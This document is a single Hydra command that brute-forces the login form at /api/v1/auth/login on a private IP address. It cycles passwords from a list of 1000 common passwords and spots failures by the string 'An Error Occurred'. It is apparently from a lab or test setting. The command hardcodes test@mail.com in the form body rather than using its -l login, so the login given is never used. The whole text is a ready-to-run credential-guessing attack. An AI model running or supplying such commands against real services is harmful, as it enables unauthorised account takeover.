hydra -l admin@mail.com -P 10-million-password-list-top-1000.txt 192.168.1.78 http-post-form "/api/v1/auth/login:user_email=test@mail.com&user_password=^PASS^:An Error Occurred" -t 4 -V
